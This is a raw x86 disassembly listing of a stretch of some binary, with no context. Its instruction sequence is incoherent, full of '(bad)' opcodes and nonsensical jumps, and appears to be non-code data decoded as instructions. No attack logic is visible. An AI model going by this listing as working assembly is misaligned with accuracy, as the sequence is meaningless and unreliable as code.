  409f33:	aas    
  409f34:	add    esp,eax
  409f36:	add    BYTE PTR [eax],al
  409f38:	or     eax,0xbc1df0f
  409f3d:	adc    dh,ch
  409f3f:	jecxz  0x409f1d
  409f41:	push   edi
  409f42:	in     eax,dx
  409f43:	(bad)  
  409f45:	sbb    dl,ah
  409f47:	shl    DWORD PTR [eax+edi*1],1
  409f4a:	clc    
  409f4b:	fdiv   st(2),st
  409f4d:	sub    al,0xc5
  409f4f:	fadd   st,st(7)
  409f51:	daa    
  409f52:	mov    edi,ecx
  409f54:	ret    
  409f55:	and    ebx,ebx
  409f57:	(bad)  
  409f58:	aam    0x22
  409f5a:	into   
  409f5b:	inc    BYTE PTR [edi+edx*2+0x60a1c3c9]
  409f62:	cld    
  409f63:	scas   eax,DWORD PTR es:[edi]
  409f64:	or     ebx,esp
  409f66:	add    BYTE PTR [eax],al
  409f68:	iret   
  409f69:	dec    ebx
  409f6a:	mov    bh,0xb0
  409f6c:	sti    
  409f6d:	fild   DWORD PTR [eax]
  409f6f:	add    bh,ch
  409f71:	cmp    eax,0xdbcbafa7
  409f76:	add    BYTE PTR [eax],al
  409f78:	push   ds
  409f79:	dec    edx
  409f7a:	mov    bl,BYTE PTR [eax-0x3236d3c8]
  409f80:	pop    ds
  409f81:	cmp    dh,bh
  409f83:	inc    DWORD PTR [ebx]
  409f85:	jmp    0x409fd9
  409f87:	dec    ebx
  409f88:	popa   
  409f89:	jg     0x409f8b
  409f8b:	add    BYTE PTR [esi],bh
  409f8d:	inc    esi
  409f8e:	mov    esp,0x9e4e33b8
  409f93:	std    
  409f94:	sbb    BYTE PTR [ecx-0x56],dl
  409f97:	mov    esp,0xa9b94d37
  409f9c:	add    BYTE PTR [ecx+0x62],bl
  409f9f:	mov    dh,0xb1
  409fa1:	and    DWORD PTR [esp+esi*4-0x60],esi
  409fa5:	xor    edi,esi
  409fa7:	in     eax,0xaa
  409fa9:	fidivr DWORD PTR [edi+eiz*4]
  409fac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fad:	in     al,dx
  409fae:	pop    esp
  409faf:	enter  0x62fb,0x53
  409fb3:	test   eax,0xaf8f55ff
  409fb8:	mov    al,ds:0x56f06
  409fbd:	bound  ebx,QWORD PTR [ecx-0x29]
  409fc0:	mov    edx,0xe0e323fc
  409fc5:	bound  ecx,QWORD PTR [eax+0x3462808e]
  409fcb:	or     ebx,DWORD PTR [eax]
  409fcd:	pop    edx
  409fce:	adc    dl,BYTE PTR [ebx]
  409fd0:	sbb    bh,BYTE PTR [eax+0x8]
  409fd3:	adc    ebp,DWORD PTR [edi]
  409fd5:	dec    esi
  409fd6:	or     DWORD PTR [edi],edx
  409fd8:	add    al,0x6c
  409fda:	leave  
  409fdb:	sub    al,0x7
  409fdd:	pop    ecx
  409fde:	sub    al,0xfb
  409fe0:	sbb    al,0x62
  409fe2:	into   
  409fe3:	mov    ch,0xba
  409fe5:	retf   0x9dcc
  409fe8:	mov    cl,0xac
  409fea:	imul   edi,DWORD PTR [ecx-0x46901861],0x161162b3
  409ff4:	dec    edx
  409ff5:	sub    eax,0x62000253
  409ffa:	cs push ebx
  409ffc:	push   ebp
  409ffd:	and    al,0x72
  409fff:	cmp    eax,0x505c004c
  40a004:	push   esi
  40a005:	push   edi
  40a006:	and    dh,BYTE PTR [eax+0x49]
  40a009:	inc    esp
  40a00a:	push   esp
  40a00b:	imul   ecx,DWORD PTR [ecx+0x44],0x23
  40a00f:	add    BYTE PTR [edx],al
  40a011:	add    BYTE PTR [edx+0x72],ah
  40a014:	popa   
  40a015:	gs or  al,0x72
  40a018:	addr16 jne 0x40a01c
  40a01b:	xchg   ebp,eax
  40a01c:	inc    dx
  40a01e:	sbb    esi,DWORD PTR [edi+0x45]
  40a021:	pop    esp
  40a022:	and    esi,DWORD PTR [edi+0x46]
  40a025:	outs   dx,DWORD PTR ds:[esi]
  40a026:	dec    DWORD PTR [ebx-0x270f9489]
  40a02c:	pop    esp
  40a02d:	js     0x40a028
  40a02f:	mov    cl,0x30
  40a031:	pop    eax
  40a032:	(bad)  
  40a033:	(bad)  [edi]
  40a035:	and    DWORD PTR [ebp+0x6500f2ba],eax
  40a03b:	frndint 
  40a03d:	std    
  40a03e:	push   edi
  40a03f:	fdivr  st(0),st
  40a041:	adc    edx,DWORD PTR [ebp-0x64]
  40a044:	add    BYTE PTR [eax],cl
  40a046:	pop    esp
  40a047:	hlt    
  40a048:	fdivp  st(7),st
  40a04a:	push   ebp
  40a04b:	mul    edi
  40a04d:	add    esp,DWORD PTR [edx-0x27]
  40a050:	mov    bl,0x9f
  40a052:	les    edi,FWORD PTR [esi]
  40a054:	dec    ecx
  40a055:	rcl    BYTE PTR ds:0x7e72ff16,cl
  40a05b:	fldcw  WORD PTR [ebp-0x60]
  40a05e:	in     eax,0x3f
  40a060:	push   ebx
  40a061:	mov    dl,al
  40a063:	cmp    BYTE PTR [ecx],dh
  40a065:	mov    al,ds:0x5c51bb00
  40a06a:	mov    ds:0xb29e38c2,al
  40a06f:	mov    esi,0xdbaba04f
  40a074:	addr16 sahf 
  40a076:	lods   al,BYTE PTR ds:[esi]
  40a077:	add    eax,0xaad6e4d
  40a07c:	inc    edi
  40a07d:	outs   dx,BYTE PTR ds:[esi]
  40a07e:	xchg   edx,eax
  40a07f:	repz push ecx
  40a081:	sub    dl,BYTE PTR [ebp+esi*8-0x197e7ddf]
  40a088:	jb     0x40a0ec
  40a08a:	mov    cs,edi
  40a08c:	fadd   DWORD PTR [edx]
  40a08e:	sub    BYTE PTR [edx+0x5b31c6c2],al
  40a094:	and    al,0x27
  40a097:	inc    ebp
  40a098:	ret    0x1487
  40a09b:	inc    ebp
  40a09c:	mov    ecx,0xd34d1ebc
  40a0a1:	mov    ch,0x1e
  40a0a3:	dec    ebx
  40a0a4:	fld    DWORD PTR [eax]
  40a0a6:	push   ds
  40a0a7:	xchg   ebp,eax
  40a0a8:	add    esi,esi
  40a0aa:	cli    
  40a0ab:	jbe    0x40a0b9
  40a0ad:	mov    esi,0xdff787bc
  40a0b2:	fadd   DWORD PTR [esi+edi*8-0x4b]
  40a0b6:	mov    bl,0x42
  40a0b8:	add    ah,bl
  40a0ba:	int    0x3a
  40a0bc:	add    al,ah
  40a0be:	mov    ebp,0xc8fe1550
  40a0c3:	sub    BYTE PTR ds:0x182aacc0,ch
  40a0c9:	mov    dl,cl
  40a0cb:	add    BYTE PTR ds:0xeaed629,bl
  40a0d1:	sub    BYTE PTR [ecx],al
  40a0d3:	xor    bl,BYTE PTR [esi-0x60]
  40a0d6:	inc    esi
  40a0d7:	xor    bl,BYTE PTR [edi-0x601ea94f]
  40a0dd:	jecxz  0x40a12d
  40a0df:	sub    bl,BYTE PTR [esp+ebx*4-0x54c3ebba]
  40a0e6:	dec    ebx
  40a0e7:	jmp    0x77417a4d
  40a0ec:	test   eax,0x1f3fd319
  40a0f1:	sub    al,dh
  40a0f3:	pop    eax
  40a0f4:	(bad)  
  40a0f5:	push   ds
  40a0f6:	int3   
  40a0f7:	xor    bl,BYTE PTR [ebp-0x59c53bd4]
  40a0fd:	(bad)  
  40a0fe:	fbld   TBYTE PTR [ecx]
  40a100:	xchg   esp,eax
  40a101:	sub    ebx,esp
  40a103:	xor    edi,ebp
  40a105:	jae    0x40a0f9
  40a107:	adc    DWORD PTR [edi+0x77e2012b],ecx
  40a10d:	aad    0x2d
  40a10f:	shl    BYTE PTR [ebp-0x3b],cl
  40a112:	cmp    ch,ch
  40a114:	ins    DWORD PTR es:[edi],dx
  40a115:	shl    BYTE PTR [eax],1
  40a117:	iret   
  40a118:	dec    ebx
  40a119:	mov    esi,0xeb52bf38
  40a11e:	sbb    al,0x0
  40a120:	xchg   esi,eax
  40a121:	mov    bh,0x2a
  40a123:	and    BYTE PTR [edx+ecx*8-0x3861f09e],dh
  40a12a:	and    DWORD PTR [edi-0x4a],esp
  40a12d:	loopne 0x40a140
  40a12f:	pop    ss
  40a130:	add    BYTE PTR [ebx-0x28],bh
  40a133:	add    BYTE PTR [eax],al
  40a135:	inc    esi
  40a136:	mov    bh,0x39
  40a138:	daa    
  40a139:	je     0x40a0c3
  40a13b:	add    bh,BYTE PTR [esi]
  40a13d:	push   0xfffffff0
  40a13f:	add    BYTE PTR [eax],al
  40a141:	dec    eax
  40a142:	fmul   DWORD PTR [esi]
  40a144:	pop    ss
  40a145:	dec    ebx
  40a146:	fadd   DWORD PTR [eax]
  40a148:	add    bl,bh
  40a14a:	inc    esp
  40a14b:	out    0xb0,eax
  40a14d:	cmp    ebx,eax
  40a14f:	add    BYTE PTR [eax],al
  40a151:	push   ss
  40a152:	loop   0x40a172
  40a154:	adc    eax,0x5505dd62
  40a159:	xor    al,0xe2
  40a15b:	unpckhps xmm7,xmm3
  40a15e:	xlat   BYTE PTR ds:[ebx]
  40a15f:	add    BYTE PTR [eax],al
  40a161:	push   0x6c636879
  40a166:	mov    ebp,DWORD PTR [edi+0x23]
  40a169:	dec    ebx
  40a16a:	cmp    DWORD PTR [eax+0x6a],0x62699c23
  40a171:	add    ebx,eax
  40a173:	add    BYTE PTR [eax],al
  40a175:	mov    bl,0x9c
  40a177:	push   esp
  40a178:	push   ebp
  40a179:	or     ebx,DWORD PTR [ebx-0x2d129cba]
  40a17f:	inc    eax
  40a180:	pop    ebx
  40a181:	hlt    
  40a182:	mov    ds:0xa3fc0000,eax
  40a187:	pop    ebp
  40a188:	push   edx
  40a189:	cld    
  40a18a:	mov    al,0x4c
  40a18c:	rep lods ax,WORD PTR ds:[esi]
  40a18f:	push   edi
  40a190:	push   eax
  40a191:	mov    ebx,0xd7
  40a196:	pop    ss
  40a197:	(bad)  
  40a198:	nop
  40a199:	xchg   esp,eax
  40a19a:	bound  ecx,QWORD PTR [esi-0x643c547a]
  40a1a0:	lahf   
  40a1a1:	xchg   ecx,eax
  40a1a2:	xlat   BYTE PTR ds:[ebx]
  40a1a3:	stos   BYTE PTR es:[edi],al
  40a1a4:	fwait
  40a1a5:	mov    edx,0xffa89dcf
  40a1aa:	jne    0x40a1a5
  40a1ac:	dec    esi
  40a1ad:	outs   dx,BYTE PTR ds:[esi]
  40a1ae:	pop    ds
  40a1af:	cmp    BYTE PTR [edi+0x5e],al
  40a1b2:	push   ds
  40a1b3:	ror    DWORD PTR [eax],1
  40a1b5:	dec    ecx
  40a1b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1b7:	les    eax,FWORD PTR [ebp+0x19]
  40a1ba:	pusha  
  40a1bb:	or     BYTE PTR ds:0x570cc935,bh
  40a1c1:	pop    edx
  40a1c2:	mov    cl,0xb9
  40a1c4:	(bad)  
  40a1c5:	push   ss
  40a1c6:	push   ecx
  40a1c7:	mov    esi,0xe662002a
  40a1cc:	std    
  40a1cd:	inc    esi
  40a1ce:	mov    ah,0xce
  40a1d0:	sbb    DWORD PTR [eax+ebx*2],ebx
  40a1d3:	add    DWORD PTR [ecx],edx
  40a1d5:	pop    es
  40a1d6:	lods   al,BYTE PTR ds:[esi]
  40a1d7:	iret   
  40a1d8:	push   ebx
  40a1d9:	add    ch,BYTE PTR [eax+0x6d4807b6]
  40a1df:	loope  0x40a240
  40a1e1:	cmp    al,0x69
  40a1e3:	(bad)  
  40a1e4:	adc    eax,0x502670b
  40a1e9:	pop    ebx
  40a1ea:	mov    ds:0x97571f06,al
  40a1ef:	imul   DWORD PTR [eax]
  40a1f1:	sub    bh,BYTE PTR [ecx]
  40a1f3:	loopne 0x40a21e
  40a1f5:	daa    
  40a1f6:	xchg   edx,eax
  40a1f7:	sub    DWORD PTR [eax+0x74],esi
  40a1fa:	add    BYTE PTR [ecx+0x62000245],al
  40a200:	jg     0x40a1da
  40a202:	cli    
  40a203:	int3   
  40a204:	ret    
  40a205:	rcl    ebp,1
  40a207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a208:	hlt    
  40a209:	add    al,0x0
  40a20b:	(bad)  
  40a20c:	shl    BYTE PTR [ebx-0x49a11e79],1
  40a212:	mov    al,ds:0xaf7ad9d7
  40a217:	ror    DWORD PTR [esi-0x18],cl
  40a21a:	add    esp,DWORD PTR [edx-0x27]
  40a21d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a21e:	adc    al,0x4a
  40a220:	retf   
  40a221:	out    0x10,eax
  40a223:	jb     0x40a211
  40a225:	jmp    0xe7f60b37
  40a22a:	add    esp,DWORD PTR [edx-0x27]
  40a22d:	hlt    
  40a22e:	cdq    
  40a22f:	out    0x5e,al
  40a231:	cmp    ebx,DWORD PTR [ebp-0x5bb2645]
  40a237:	xchg   cl,al
  40a239:	add    BYTE PTR [esi],cl
  40a23b:	imul   esp,esp,0xf5931dfc
  40a241:	icebp  
  40a242:	or     BYTE PTR [ecx-0x13],dh
  40a245:	jecxz  0x40a24a
  40a247:	addr16 fsubr st(7),st
  40a24a:	add    esp,DWORD PTR [edx-0x27]
  40a24d:	sub    BYTE PTR [esi-0x5a],cl
  40a250:	cwde   
  40a251:	out    0x3,eax
  40a253:	(bad)  
  40a254:	fst    DWORD PTR [ecx-0x17a0fa09]
  40a25a:	add    esp,DWORD PTR [edx-0x27]
  40a25d:	adc    BYTE PTR [eax+0x0],dh
  40a260:	xchg   ecx,eax
  40a261:	jbe    0x40a24a
  40a263:	add    esp,DWORD PTR [edx-0x27]
  40a266:	add    BYTE PTR [edx+ebp*2-0x20],dh
  40a26a:	fdiv   DWORD PTR [esi+0x62]
  40a26d:	fxch   st(2)
  40a26f:	daa    
  40a270:	xor    edi,DWORD PTR [edx-0x43d4d14e]
  40a276:	xlat   BYTE PTR ds:[ebx]
  40a277:	sub    DWORD PTR [esi+0x6203e7d1],eax
  40a27d:	fldcw  WORD PTR [ebp-0x1864daab]
  40a283:	add    esp,DWORD PTR [edx-0x27]
  40a286:	and    ch,cl
  40a288:	stos   DWORD PTR es:[edi],eax
  40a289:	and    ebp,DWORD PTR ds:0x122dae0
  40a28f:	inc    edi
  40a290:	xlat   BYTE PTR ds:[ebx]
  40a291:	push   ss
  40a292:	out    dx,eax
  40a293:	pop    edx
  40a294:	ficomp WORD PTR [ebx-0x3f]
  40a297:	sbb    al,0x1f
  40a299:	push   0xffffff9a
  40a29b:	inc    edx
  40a29c:	xchg   ecx,eax
  40a29d:	pusha  
  40a29e:	pushf  
  40a29f:	jg     0x40a258
  40a2a1:	arpl   ax,dx
  40a2a3:	sub    DWORD PTR [esi-0x2c9001ef],edx
  40a2a9:	push   edi
  40a2aa:	and    DWORD PTR [esi-0x20],0xb5470156
  40a2b1:	inc    edi
  40a2b2:	mov    bh,0x39
  40a2b4:	enter  0x8146,0x8f
  40a2b8:	or     dl,BYTE PTR [ebx-0x41]
  40a2bb:	mov    eax,ds:0x9f0153ff
  40a2c0:	std    
  40a2c1:	cmp    al,0xa5
  40a2c3:	fwait
  40a2c4:	add    BYTE PTR [ecx],al
  40a2c6:	adc    esi,edi
  40a2c8:	mov    ebx,0xe9e80519
  40a2cd:	popa   
  40a2ce:	fld    DWORD PTR [eax]
  40a2d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2d1:	fcomp  QWORD PTR [ecx+ecx*4]
  40a2d4:	pop    esp
  40a2d5:	test   eax,0x9618fe10
  40a2da:	xchg   ecx,eax
  40a2db:	arpl   WORD PTR [edi],bp
  40a2dd:	add    BYTE PTR [ebx-0x2699ee9e],0x0
  40a2e4:	mov    ch,0x33
  40a2e6:	rcl    DWORD PTR cs:[edx-0x4c2dd4ee],0x2a
  40a2ee:	and    cl,cl
  40a2f0:	jmp    0xd9417c56
  40a2f5:	dec    esi
  40a2f6:	repnz add al,0x16
  40a2f9:	(bad)  
  40a2fa:	fstp   DWORD PTR ds:0xd961e9
  40a300:	ret    0x7b2f
  40a303:	jge    0x40a2ba
  40a305:	sub    BYTE PTR [edx-0x7850ff95],cl
  40a30b:	outs   dx,DWORD PTR ds:[esi]
  40a30c:	popa   
  40a30d:	retf   
  40a30e:	fadd   QWORD PTR [eax]
  40a310:	add    BYTE PTR [edx],cl
  40a312:	xchg   ecx,eax
  40a313:	mov    ds:0x8993098e,al
  40a318:	popf   
  40a319:	loop   0x40a370
  40a31b:	cwde   
  40a31c:	add    BYTE PTR [edi],ch
  40a31e:	outs   dx,BYTE PTR ds:[esi]
  40a31f:	test   BYTE PTR [edx-0x4c4fbecf],ch
  40a325:	sbb    al,0xd5
  40a327:	add    BYTE PTR [eax],al
  40a329:	add    BYTE PTR [ebp+0x7e2802de],bl
  40a32f:	jecxz  0x40a34a
  40a331:	sbb    eax,0x131f0d84
  40a336:	(bad)  
  40a337:	fadd   QWORD PTR [eax]
  40a339:	add    dh,ch
  40a33b:	ins    BYTE PTR es:[edi],dx
  40a33c:	mov    cl,0x9b
  40a33e:	jmp    0xfe6d:0xe0a19c34
  40a345:	call   FWORD PTR [esi-0x12]
  40a348:	das    
  40a349:	sbb    ebp,DWORD PTR [edx-0x4a]
  40a34c:	push   ds
  40a34d:	xor    dl,BYTE PTR [ecx-0x48]
  40a350:	and    bh,BYTE PTR [edx]
  40a352:	gs aad 0x0
  40a355:	add    dh,bh
  40a357:	dec    esp
  40a358:	sar    ebx,1
  40a35a:	shr    BYTE PTR [ecx],1
  40a35c:	aad    0xd0
  40a35e:	mov    ebp,0xc3c9c71b
  40a363:	and    esp,esi
  40a365:	int3   
  40a366:	mov    ch,0x18
  40a368:	rcl    dh,cl
  40a36a:	les    ebp,FWORD PTR [edx]
  40a36c:	(bad)  
  40a36d:	(bad)  
  40a36e:	jp     0x40a371
  40a370:	in     eax,0xcf
  40a372:	je     0x40a36a
  40a374:	loopne 0x40a35a
  40a376:	imul   eax,DWORD PTR [eax],0x2e47fdf3
  40a37c:	sar    cl,0x26
  40a37f:	mul    edx
  40a381:	in     al,dx
  40a382:	bound  esp,QWORD PTR [ecx+eax*1+0x4d6d6200]
  40a389:	jbe    0x40a3b7
  40a38b:	inc    eax
  40a38c:	inc    edx
  40a38d:	dec    ecx
  40a38e:	add    BYTE PTR [ecx],dh
  40a390:	inc    esp
  40a391:	inc    eax
  40a392:	inc    ebp
  40a393:	sub    eax,0x115c4736
  40a398:	data16 cmp bl,BYTE PTR [ebp+0x29]
  40a39c:	add    al,BYTE PTR [edx]
  40a39e:	add    BYTE PTR [edx+0x20],ah
  40a3a1:	sub    al,0x15
  40a3a3:	aas    
  40a3a4:	sbb    eax,0x15722a27
  40a3a9:	sub    eax,0x35514227
  40a3ae:	and    esp,DWORD PTR [edx+0x12]
  40a3b1:	(bad)  
  40a3b3:	xchg   DWORD PTR [edx],edx
  40a3b5:	repz cli 
  40a3b7:	xchg   esp,eax
  40a3b8:	psubsw mm4,mm7
  40a3bb:	push   edi
  40a3bc:	add    DWORD PTR [edx],eax
  40a3be:	add    BYTE PTR [edx+0x55],ah
  40a3c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3c2:	mov    dh,0x3
  40a3c4:	jl     0x40a377
  40a3c6:	mov    dl,0xfe
  40a3c8:	mov    WORD PTR [ebx+0x20100b4],ds
  40a3ce:	add    BYTE PTR [edx+0x74],ah
  40a3d1:	adc    DWORD PTR [ebp-0x6872a51e],0xffffffd3
  40a3d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3d9:	mov    bl,BYTE PTR [edx+eiz*2+0x750908db]
  40a3e0:	and    eax,0xfd5e0ff8
  40a3e5:	adc    edx,DWORD PTR [eax]
  40a3e7:	bound  eax,QWORD PTR [eax]
  40a3e9:	add    al,BYTE PTR [eax]
  40a3eb:	bound  ebp,QWORD PTR [ecx]
  40a3ed:	sbb    BYTE PTR [ebx],bh
  40a3ef:	inc    edi
  40a3f0:	imul   DWORD PTR [ebx]
  40a3f2:	xor    eax,0x26473600
  40a3f7:	xor    edi,DWORD PTR [esi]
  40a3f9:	das    
  40a3fa:	xor    BYTE PTR [edi],dh
  40a3fc:	test   ecx,ebx
  40a3fe:	out    0x3,eax
  40a400:	(bad)  
  40a401:	fldenv [esi-0x7c]
  40a404:	neg    BYTE PTR [edx-0x7f]
  40a407:	nop
  40a408:	call   0xded71d80
  40a40d:	arpl   WORD PTR [ecx+0x6d69da77],cx
  40a413:	(bad)  
  40a414:	out    0xd9,al
  40a416:	adc    ecx,ebp
  40a418:	xchg   edi,eax
  40a419:	xor    DWORD PTR [edx],edi
  40a41b:	mov    ecx,0xd53d2dab
  40a420:	cdq    
  40a421:	adc    al,0x28
  40a423:	aam    0x8d
  40a425:	push   cs
  40a426:	xchg   ebx,eax
  40a427:	addr16 sti 
  40a429:	lea    esi,[ebx+ebx*2+0x6f79920f]
  40a430:	sbb    DWORD PTR [esi-0x7a02a67a],eax
  40a436:	jb     0x40a43b
  40a438:	(bad)  
  40a439:	fxch   st(3)
  40a43b:	or     al,0x6c
  40a43d:	icebp  
  40a43e:	sbb    DWORD PTR [ebx],ecx
  40a440:	ja     0x40a41d
  40a442:	sbb    eax,0xeddc5d06
  40a447:	clc    
  40a448:	inc    ebp
  40a449:	push   cs
  40a44a:	and    BYTE PTR [ecx],bh
  40a44c:	cwde   
  40a44d:	popf   
  40a44e:	dec    ebp
  40a44f:	aaa    
  40a450:	stos   DWORD PTR es:[edi],eax
  40a451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a452:	push   ecx
  40a453:	inc    ebx
  40a454:	mov    esp,DWORD PTR [ebp-0x6dffb6ec]
  40a45a:	mov    al,0xe7
  40a45c:	add    esp,DWORD PTR [edx-0x27]
  40a45f:	dec    esp
  40a460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a461:	int3   
  40a462:	aaa    
  40a463:	jae    0x40a40b
  40a465:	retf   0x5552
  40a468:	call   0x52ce:0x85514cc8
  40a46f:	cmp    al,0x3
  40a471:	(bad)  
  40a472:	fldcw  WORD PTR [ecx+0x1171dbe]
  40a478:	test   DWORD PTR [edx],edx
  40a47a:	xor    dl,al
  40a47c:	xchg   edi,eax
  40a47d:	mov    bh,0x2b
  40a47f:	sar    DWORD PTR [ebx],1
  40a481:	stos   BYTE PTR es:[edi],al
  40a482:	es int 0x35
  40a485:	mov    eax,0x613ec017
  40a48a:	fld    DWORD PTR [eax]
  40a48c:	(bad)
  40a490:	pop    ecx
  40a491:	fnstcw WORD PTR [eax]
  40a493:	lods   al,BYTE PTR ds:[esi]
  40a494:	jns    0x40a465
  40a496:	dec    eax
  40a497:	lods   eax,DWORD PTR ds:[esi]
  40a498:	(bad)  
  40a499:	cli    
  40a49a:	ins    DWORD PTR es:[edi],dx
  40a49b:	mov    bh,0x65
  40a49d:	les    edx,FWORD PTR [ecx-0x53]
  40a4a0:	jmp    0x2f417e06
  40a4a5:	enter  0xcb31,0x9
  40a4a9:	cdq    
  40a4aa:	sub    ah,bl
  40a4ac:	sub    DWORD PTR [edi-0x45e022e8],ebp
  40a4b2:	sbb    eax,0x2198f5c7
  40a4b7:	les    ebp,FWORD PTR [ecx]
  40a4b9:	cdq    
  40a4ba:	adc    eax,0xbc00a401
  40a4bf:	mov    gs,WORD PTR [eax]
  40a4c1:	push   ebx
  40a4c2:	mov    esi,0xa8457777
  40a4c7:	mov    edx,0x7fa94b6b
  40a4cc:	jbe    0x40a519
  40a4ce:	jb     0x40a4a9
  40a4d0:	add    ch,al
  40a4d2:	sti    
  40a4d3:	sub    eax,esp
  40a4d5:	mov    ds:0xa2c86224,al
  40a4da:	adc    cl,BYTE PTR [ebp-0x3c]
  40a4dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4de:	sub    DWORD PTR [edx-0x3c],ebx
  40a4e1:	scas   al,BYTE PTR es:[edi]
  40a4e2:	sub    DWORD PTR [edi],ebp
  40a4e4:	enter  0x25ae,0x2e
  40a4e8:	xchg   edi,eax
  40a4e9:	jmp    0xa6417e4f
  40a4ee:	pop    es
  40a4ef:	adc    ebp,ebp
  40a4f1:	add    ch,ah
  40a4f3:	imul   ecx
  40a4f5:	test   eax,0xe2e7f7d1
  40a4fa:	xor    BYTE PTR gs:[esi-0x10cbac12],bl
  40a501:	(bad)  
  40a502:	xor    eax,DWORD PTR [edi]
  40a504:	out    0xed,al
  40a506:	add    edx,esi
  40a508:	add    BYTE PTR [eax],al
  40a50a:	addr16 out 0x17,eax
  40a50d:	sbb    eax,0x154e7b8
  40a512:	xchg   esi,eax
  40a513:	lahf   
  40a514:	adc    al,0x16
  40a516:	mov    edi,ds
  40a518:	pop    esp
  40a519:	adc    DWORD PTR [esi-0x3af30028],edi
  40a51f:	or     al,0xb
  40a521:	or     eax,DWORD PTR [eax]
  40a523:	(bad)  
  40a524:	fimul  DWORD PTR ds:0x16068f1c
  40a52a:	add    al,0xae
  40a52c:	sar    DWORD PTR [esi+0x0],0xd3
  40a530:	xchg   esi,eax
  40a531:	push   ebx
  40a532:	push   ecx
  40a533:	mov    esp,0xc24d1893
  40a538:	fisttp DWORD PTR [edi+0x4d]
  40a53b:	les    ebp,FWORD PTR [eax+0x3004543]
  40a541:	dec    edi
  40a542:	inc    edx
  40a543:	test   bl,cl
  40a545:	inc    edi
  40a546:	inc    edi
  40a547:	jns    0x40a555
  40a549:	inc    ebp
  40a54a:	push   ecx
  40a54b:	cmp    ebx,eax
  40a54d:	inc    edi
  40a54e:	dec    edi
  40a54f:	nop
  40a550:	mov    ah,0x37
  40a552:	push   0xd837
  40a557:	fistp  WORD PTR [ebp-0x72]
  40a55a:	xchg   esp,eax
  40a55b:	mov    DWORD PTR [edi+0x53b9de90],ecx
  40a561:	pushf  
  40a562:	lahf   
  40a563:	xchg   edi,eax
  40a564:	bound  edx,QWORD PTR [ebx-0x34ab6c2a]
  40a56a:	xchg   BYTE PTR [edx+0x7e],ah
  40a56d:	jg     0x40a4f8
  40a56f:	sub    al,0x36
  40a571:	xchg   ecx,eax
  40a572:	int3   
  40a573:	bound  edx,QWORD PTR [ecx+0x696291ed]
  40a579:	int3   
  40a57a:	rcl    DWORD PTR [esp+esi*1],1
  40a57d:	enter  0x6287,0xc4
  40a581:	stos   DWORD PTR es:[edi],eax
  40a582:	mov    ch,0x12
  40a584:	pop    edi
  40a585:	stos   DWORD PTR es:[edi],eax
  40a586:	lahf   
  40a587:	add    BYTE PTR [edx+0x7c],ah
  40a58a:	xchg   BYTE PTR [ecx+ebp*8-0x2f78747b],cl
  40a591:	xchg   DWORD PTR [ecx-0x7d11f77d],eax
  40a597:	scas   al,BYTE PTR es:[edi]
  40a598:	xchg   ebp,eax
  40a599:	in     al,dx
  40a59a:	leave  
  40a59b:	xchg   esi,eax
  40a59c:	repz mov ch,0xc9
  40a59f:	shl    al,cl
  40a5a1:	mov    dh,0x73
  40a5a3:	xchg   esi,eax
  40a5a4:	jecxz  0x40a5a7
  40a5a6:	add    al,BYTE PTR [eax]
  40a5a8:	bound  esp,QWORD PTR [esi-0x6849586d]
  40a5ae:	mov    dl,0xa8
  40a5b0:	bound  esi,QWORD PTR [edx+eax*4-0x75]
  40a5b4:	jmp    0xcac3663c
  40a5b9:	jg     0x40a53f
  40a5bb:	jmp    DWORD PTR [ebp+0x41]
  40a5be:	pop    es
  40a5bf:	jne    0x40a592
  40a5c1:	sub    al,0xb
  40a5c3:	pop    esp
  40a5c4:	mov    al,0xe1
  40a5c6:	dec    edi
  40a5c7:	pop    edi
  40a5c8:	add    dl,0x4d
  40a5cb:	push   ecx
  40a5cc:	pop    esp
  40a5cd:	mov    eax,0xf659625e
  40a5d2:	xor    al,0x43
  40a5d4:	je     0x40a594
  40a5d6:	cmp    BYTE PTR [ecx],dh
  40a5d8:	mov    ds:0x9d1742b4,eax
  40a5dd:	jmp    0x40a630
  40a5df:	xor    DWORD PTR [ebp-0x46],ebx
  40a5e2:	sub    ah,BYTE PTR [esi+ecx*2]
  40a5e5:	fxch   st(0)
  40a5e7:	sbb    al,0x92
  40a5e9:	xchg   BYTE PTR [edx],bl
  40a5eb:	and    BYTE PTR [eax],al
  40a5ed:	mov    WORD PTR [esp+eax*8-0x24cc1e1],es
  40a5f4:	sbb    BYTE PTR [ebx-0x7de12d6e],ah
  40a5fa:	mov    ch,0xbd
  40a5fc:	adc    eax,0xad1c82d
  40a601:	jg     0x40a5a2
  40a603:	retf   
  40a604:	add    al,0x39
  40a606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a607:	lods   eax,DWORD PTR ds:[esi]
  40a608:	inc    edi
  40a609:	jb     0x40a5af
  40a60b:	out    0x3,eax
  40a60d:	(bad)  
  40a60e:	(bad)  [edx+0x414d0aac]
  40a614:	stos   BYTE PTR es:[edi],al
  40a615:	pop    es
  40a616:	ds jle 0x40a5f9
  40a619:	add    dh,BYTE PTR [ebx]
  40a61b:	jne    0x40a5f0
  40a61d:	xchg   edx,eax
  40a61e:	div    DWORD PTR [edx-0x59]
  40a621:	enter  0x1f1a,0xec
  40a625:	(bad)  
  40a626:	dec    esi
  40a627:	dec    ecx
  40a628:	mov    ebp,0x9c5403a6
  40a62d:	into   
  40a62e:	inc    esi
  40a62f:	jno    0x40a5e9
  40a631:	jge    0x40a63d
  40a633:	(bad)  
  40a634:	adc    al,0x35
  40a636:	rol    ebx,0x18
  40a639:	sub    DWORD PTR [edx+eax*8-0x383dbddf],edi
  40a640:	xor    ecx,DWORD PTR [edx-0x6fd33d37]
  40a646:	(bad)  
  40a647:	push   cs
  40a648:	sbb    esp,DWORD PTR [edx-0x22]
  40a64b:	jmp    0xd:0x17c16a10
  40a652:	pop    ebp
  40a653:	aad    0xc
  40a655:	adc    eax,0x1f00ed83
  40a65a:	js     0x40a618
  40a65c:	repz cs js 0x40a623
  40a660:	add    dh,dl
  40a662:	xchg   ebx,eax
